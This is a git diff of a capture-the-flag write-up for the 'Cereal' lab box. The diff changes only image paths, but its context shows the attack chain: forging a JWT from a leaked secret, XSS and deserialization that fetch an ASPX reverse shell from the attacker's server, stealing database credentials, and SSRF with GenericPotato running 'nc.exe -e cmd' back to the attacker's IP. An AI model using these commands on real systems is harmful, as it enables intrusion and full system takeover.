@@ -55,26 +55,26 @@ Not a whole lot we can do with that version of OpenSSH without credentials, so I
 
 Heading over to port 80 forces us to use HTTPS over on port 443, bringing us to a login panel after accepting the self-signed cert.
 
-![](../assets/img/2026-05-22-Cereal/1.png)
+![](/assets/img/2026-05-22-Cereal/1.png)
 
 Capturing a POST request to this panel shows that we are sending JSON in the body data and the server's response headers discloses something interesting. The `X-Powered-By: Sugar` header indicates that this web application is built with SugarCRM which is a cloud-based platform designed to help sales teams manage customer relationships. Note that this itself is not definitive and could also be a custom value.
 
-![](../assets/img/2026-05-22-Cereal/2.png)
+![](/assets/img/2026-05-22-Cereal/2.png)
 
 This is good to keep in mind for any publicly known exploits later on, but without a version I'll move on. Checking the form for any SQL Injection or forms of auth bypass all lead to a blank page.
 
 Heading over to the source subdomain immediately throws a server error indicating that we are loading files from the `C:\inetpub\source` directory.
 
-![](../assets/img/2026-05-22-Cereal/3.png)
+![](/assets/img/2026-05-22-Cereal/3.png)
 
 ### Exposed Git Repository
 Curious as to why this subdomain was named source, I checked to see if there were any configuration files or a `.git` directory that we could access. A request to the ladder throws a 403 Forbidden which is promising.
 
-![](../assets/img/2026-05-22-Cereal/4.png)
+![](/assets/img/2026-05-22-Cereal/4.png)
 
 If we navigate to a page that should not exist on the web server, we're met with a 404 Not Found error instead, confirming the existence of a Git directory.
 
-![](../assets/img/2026-05-22-Cereal/5.png)
+![](/assets/img/2026-05-22-Cereal/5.png)
 
 I'll use a tool called [Git-Dumper](https://github.com/arthaud/git-dumper) in order to download all exposed Git files to my local machine in hopes to uncover any secrets like credentials or keys. We can also install this with pipx on Debian systems since it's environment is managed externally.
 
@@ -84,7 +84,7 @@ I'll use a tool called [Git-Dumper](https://github.com/arthaud/git-dumper) in or
 └─$ git-dumper http://source.cereal.htb/.git/ git
 ```
 
-![](../assets/img/2026-05-22-Cereal/6.png)
+![](/assets/img/2026-05-22-Cereal/6.png)
 
 Displaying the logs made shows that the author made several changes over a few commits, one regarding security fixes stands out most.
 
@@ -94,7 +94,7 @@ Displaying the logs made shows that the author made several changes over a few c
 └─$ git log
 ```
 
-![](../assets/img/2026-05-22-Cereal/7.png)
+![](/assets/img/2026-05-22-Cereal/7.png)
 
 We can get the difference between the commits by supplying each hash in order.
 
@@ -102,7 +102,7 @@ We can get the difference between the commits by supplying each hash in order.
 └─$ git diff 8f2a1a88f15b9109e1f63e4e4551727bfb38eee5 7bd9533a2e01ec11dfa928bd491fe516477ed291
 ```
 
-![](../assets/img/2026-05-22-Cereal/8.png)
+![](/assets/img/2026-05-22-Cereal/8.png)
 
 ### Forging JWT
 This gives us some insight into a possible attack vector on the application. A more recent change was made to filter certain string such as `objectdataprovider`, `windowsidentity`, and `system` in database requests as a preventative measure for deserialization attacks. Below that, we can gather what was a hardcoded secret key that is used to create JWTs on the site.
@@ -148,7 +148,7 @@ The code will look for a username/password and return null if none are found. Ho
 
 Logically we'd like our fabricated JWT to be as similar to the site's code as possible, so I'll open up the `UserServer.cs` file in an IDE.
 
-![](../assets/img/2026-05-22-Cereal/9.png)
+![](/assets/img/2026-05-22-Cereal/9.png)
 
 After resolving a few easy issues by installing missing packages, we can run the code and see what a valid JWT looks like. Decoding it with [jwt.io](https://www.jwt.io/) shows the structure to replicate.
 
@@ -171,7 +171,7 @@ from datetime import datetime, timedelta
 print(jwt.encode({'name': "1", "exp": datetime.utcnow() + timedelta(days=7)}, 'secretlhfIH&FY*#oysuflkhskjfhefesf', algorithm="HS256"))
 ```
 
-![](../assets/img/2026-05-22-Cereal/10.png)
+![](/assets/img/2026-05-22-Cereal/10.png)
 
 This gives us a token to place into our browser's local storage via the developer tools section. We must make a new key/value pair and name it currentUser, then refresh the page.
 
@@ -183,18 +183,18 @@ currentUser
 {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMSIsImV4cCI6MTc4MDAzODczNH0.iYPKdOMyUqvY4slGv-anW52J9RAA_gyrhRDjOPS7XKI"}
 ```
 
-![](../assets/img/2026-05-22-Cereal/11.png)
+![](/assets/img/2026-05-22-Cereal/11.png)
 
 ## Web Exploitation
 
 ### Code Review
 With access to the dashboard, we're able to make requests to the server by sending JSON data in a POST request.
 
-![](../assets/img/2026-05-22-Cereal/12.png)
+![](/assets/img/2026-05-22-Cereal/12.png)
 
 Looking at these headers shows a rate limiting function that allows six requests within a five minute time frame, stopping any subsequent requests after it has been reached.
 
-![](../assets/img/2026-05-22-Cereal/13.png)
+![](/assets/img/2026-05-22-Cereal/13.png)
 
 Reading through the source code behind this in `/Controllers/RequestsController.cs` reveals what the server's doing to our input. Whenever we make a POST request to the site, it is handled with the Create function. 
 
@@ -304,7 +304,7 @@ We can find the whitelist in `appsettings.json` which basically means that any f
 ### Cross-Site Scripting
 A bit more time digging through the source code and using the developer tool's debugger led me to discovering an XSS vulnerability in an Admin page.
 
-![](../assets/img/2026-05-22-Cereal/14.png)
+![](/assets/img/2026-05-22-Cereal/14.png)
 
 This page calls `requestService.getCerealRequests()`, storing the result in the page state.
 
@@ -403,7 +403,7 @@ Attempting to get a hit back to my web server from this was very difficult since
 
 Thanks 0xdf :)
 
-![](../assets/img/2026-05-22-Cereal/15.png)
+![](/assets/img/2026-05-22-Cereal/15.png)
 
 ### File Upload Helper
 Now that we know there really is someone hitting that Admin page, we can move to exploiting this to get deserialization on the server. Another pass at the code shows something interesting. The `DownloadHelper` function within `DownloadHelper.cs` eventually grabs a file from a URL and saves it at `FilePath`.
@@ -599,7 +599,7 @@ Finally running this seems to work as intended.
 └─$ python3 final.py cereal.htb http://10.10.14.48/shell.aspx shell.aspx
 ```
 
-![](../assets/img/2026-05-22-Cereal/16.png)
+![](/assets/img/2026-05-22-Cereal/16.png)
 
 After a bit of waiting, the XSS payload procs and our [ASPX shell](https://github.com/borjmz/aspx-reverse-shell) is fetched from our web server.
 
@@ -607,7 +607,7 @@ After a bit of waiting, the XSS payload procs and our [ASPX shell](https://githu
 └─$ python3 -m http.server 80
 ```
 
-![](../assets/img/2026-05-22-Cereal/17.png)
+![](/assets/img/2026-05-22-Cereal/17.png)
 
 Reviewing the code once more shows that our file's name is sent to the `/uploads` directory and prepended with `21098374243-`. Setting up a Netcat listener and navigating there succeeds to get a foothold on the system.
 
@@ -615,14 +615,14 @@ Reviewing the code once more shows that our file's name is sent to the `/uploads
 └─$ rlwrap -cAr nc -lvnp 443
 ```
 
-![](../assets/img/2026-05-22-Cereal/18.png)
+![](/assets/img/2026-05-22-Cereal/18.png)
 
 At this point we can grab the user flag from their Desktop folder and begin looking at routes to escalate privileges to Administrator.
 
 ## Privilege Escalation
 Listing our group memberships and token permissions shows that we are apart of the `source.cereal.htb` group, prompting me to check out the local source code for both web apps.
 
-![](../assets/img/2026-05-22-Cereal/19.png)
+![](/assets/img/2026-05-22-Cereal/19.png)
 
 ### Creds in SQLite DB
 The source directory was largely the same, however the main site's webroot at `C:\inetpub\cereal` contains a DB directory with just one file inside. It's a database file in SQLite3 format, but simply typing it to the terminal shows our serialized request along with what looks to be credentials for our current user. 
@@ -633,7 +633,7 @@ _Note: Transferring this to our local machine and using the sqlite3 utlity on it
 PS> type C:\inetpub\cereal\cereal.db
 ```
 
-![](../assets/img/2026-05-22-Cereal/20.png)
+![](/assets/img/2026-05-22-Cereal/20.png)
 
 Attempting these over SSH works to give us a proper shell on the box.
 
@@ -641,12 +641,12 @@ Attempting these over SSH works to give us a proper shell on the box.
 └─$ ssh sonny@cereal.htb
 ```
 
-![](../assets/img/2026-05-22-Cereal/21.png)
+![](/assets/img/2026-05-22-Cereal/21.png)
 
 ### Failed SeImpersonate Attempts
 This user has the SeImpersonate Privilege, but using common exploit tools that abuse the Print Spooler service such as [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [SweetPotato](https://github.com/CCob/SweetPotato) both fail due to it being disabled on this box.
 
-![](../assets/img/2026-05-22-Cereal/22.png)
+![](/assets/img/2026-05-22-Cereal/22.png)
 
 Same goes for [RoguePotato](https://github.com/antonioCoco/RoguePotato), but this is because outbound TCP traffic over port 135 (RPC) is blocked. We can check this by running an HTTP request over the suspected port and the default.
 
@@ -656,11 +656,11 @@ PS> wget http://10.10.14.48:135/test.txt
 PS> wget http://10.10.14.48/test.txt
 ```
 
-![](../assets/img/2026-05-22-Cereal/23.png)
+![](/assets/img/2026-05-22-Cereal/23.png)
 
 They both error out, but the second one over port 80 at least attempts to grab it from our server.
 
-![](../assets/img/2026-05-22-Cereal/24.png)
+![](/assets/img/2026-05-22-Cereal/24.png)
 
 ### SSRF in Internal Web App
 Moving on from that, we can discover another web application running on port 8080 that failed to show up on our Nmap scans. 
@@ -669,7 +669,7 @@ Moving on from that, we can discover another web application running on port 808
 PS> netstat -ano
 ```
 
-![](../assets/img/2026-05-22-Cereal/25.png)
+![](/assets/img/2026-05-22-Cereal/25.png)
 
 Attempting to connect to it remotely just hangs.
 
@@ -677,7 +677,7 @@ Attempting to connect to it remotely just hangs.
 └─$ nc -zv cereal.htb 8080 
 ```
 
-![](../assets/img/2026-05-22-Cereal/26.png)
+![](/assets/img/2026-05-22-Cereal/26.png)
 
 We'll need to port forward this to gain access, so I restablish my SSH connection with the `-L` flag to forward this web server to my local machine on port 1234.
 
@@ -687,7 +687,7 @@ We'll need to port forward this to gain access, so I restablish my SSH connectio
 
 Now we can navigate to the site on localhost through a browser or using cURL. This just shows a basic page that displays status information for manufacturing plants in operation.
 
-![](../assets/img/2026-05-22-Cereal/27.png)
+![](/assets/img/2026-05-22-Cereal/27.png)
 
 Looking at the page's source code shows a bunch of HTML along with some JavaScript that makes a POST request to the `/api/graphql` endpoint to pull the status information we're seeing.
 
@@ -710,7 +710,7 @@ Mimicking this request using cURL fetches the same data, but we'll be able to en
 └─$ curl -X POST http://127.0.0.1:1234/api/graphql -d '{ "query": "{allPlants { id, location, status } }" }' -H 'Content-Type: application/json'
 ```
 
-![](../assets/img/2026-05-22-Cereal/28.png)
+![](/assets/img/2026-05-22-Cereal/28.png)
 
 [Hacktricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html#querying) provides a good source for commands that will help us out here. If you're unfamiliar with GraphQL, [this post](https://blog.postman.com/what-is-a-graphql-api-how-does-it-work/) is a good read for a basic understanding of what it's used for.
 
@@ -720,7 +720,7 @@ Further enumeration lets us grab the arguments for each mutation.
 └─$ curl -X POST http://127.0.0.1:1234/api/graphql -d '{ "query": "{__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}" }' -H 'Content-Type: application/json'
 ```
 
-![](../assets/img/2026-05-22-Cereal/29.png)
+![](/assets/img/2026-05-22-Cereal/29.png)
 
 At the very end there is an interesting mutation named updatePlant that takes in a sourceURL parameter.
 
@@ -778,11 +778,11 @@ If we update our request to hit this mutation and provide our own IP in the `sou
 -H 'Content-Type: application/json'
 ```
 
-![](../assets/img/2026-05-22-Cereal/30.png)
+![](/assets/img/2026-05-22-Cereal/30.png)
 
 It fails to update, but we get a hit back on our local web server.
 
-![](../assets/img/2026-05-22-Cereal/31.png)
+![](/assets/img/2026-05-22-Cereal/31.png)
 
 ### Using GenericPotato
 Upon doing research on combinations of SSRF and the SeImpersonate privilege, I stumble across yet another potato exploit named [GenericPotato](https://github.com/micahvandeusen/GenericPotato). This exploit is a modified version of SweetPotato that supports impersonation authentication over HTTP or named pipes. Crucially, it's tailor-made for escalating privileges from SSRF vulnerabilities or arbitrary file writes.
@@ -795,7 +795,7 @@ After compiling this on a Windows VM or downloading a pre-compiled binary from o
 └─$ scp nc.exe sonny@cereal.htb:\nc.exe
 ```
 
-![](../assets/img/2026-05-22-Cereal/32.png)
+![](/assets/img/2026-05-22-Cereal/32.png)
 
 Now we'll setup GenericPotato to listen on HTTP and have it execute a reverse shell using the Netcat binary. I should note that our binary needs to be in a world-readable directory, so I just created a temp one at the `C:\` drive's root.
 
@@ -803,7 +803,7 @@ Now we'll setup GenericPotato to listen on HTTP and have it execute a reverse sh
 PS>.\GenericPotato.exe -p "C:\temp\nc.exe" -a "10.10.14.48 443 -e cmd" -e HTTP
 ```
 
-![](../assets/img/2026-05-22-Cereal/33.png)
+![](/assets/img/2026-05-22-Cereal/33.png)
 
 Make sure to setup our Netcat listener to receive the connection and then send the SSRF request to proc the exploit.
 
@@ -815,11 +815,11 @@ Make sure to setup our Netcat listener to receive the connection and then send t
 -H 'Content-Type: application/json'
 ```
 
-![](../assets/img/2026-05-22-Cereal/34.png)
+![](/assets/img/2026-05-22-Cereal/34.png)
 
 This will still return false as it's not a valid update, however we are granted a shell on the machine as `NT AUTHORITY\SYSTEM`. Finally we can grab the root flag under the Administrator's desktop folder to complete this challenge.
 
-![](../assets/img/2026-05-22-Cereal/35.png)
+![](/assets/img/2026-05-22-Cereal/35.png)
 
 Overall, this box was very hard for me purely because the code review and exploit development aspects are still relatively new to me. Discovering the independent vulnerabilities wasn't too difficult but knowing how to chain them together to get a meaningful result was quite the task. 
 
